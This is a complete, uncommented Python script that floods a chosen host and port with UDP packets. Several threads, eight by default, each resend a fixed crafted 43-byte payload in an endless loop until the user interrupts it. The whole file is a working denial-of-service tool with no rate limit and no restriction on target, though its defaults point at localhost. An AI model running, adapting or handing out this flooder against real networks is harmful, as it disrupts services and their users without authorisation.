import socket
import codecs
import click
from threading import Thread

payload = [0x90, 0x04, 0x01, 0xC0, 0xA8, 0x00, 0x01, 0xC0, 0xA8, 0x00, 0x02, 0x04, 0xD2, 0x00, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
payload = codecs.decode("".join(["%02x"%(x%256) for x in payload]), "hex")

class Sender(Thread):
    def __init__(self, host, port, thread_id):
        Thread.__init__(self)
        self.daemon = True

        self.host = host
        self.port = port
        self.thread_id = thread_id
        self.running = True
        
    def run(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while self.running:
            sock.sendto(payload, (self.host, self.port))

@click.command()
@click.option("--host", default="127.0.0.1")
@click.option("--port", default=4444)
@click.option("--threads", default=8, type=int)
def main(host, port, threads):
    senders = []
    for thread_id in range(threads):
        s = Sender(host, port, thread_id)
        s.start()
        senders.append(s)

    try:
        for t in senders:
            t.join(None)
    except KeyboardInterrupt:
        for t in senders:
            t.running = False

if __name__ == "__main__":
    main()
    
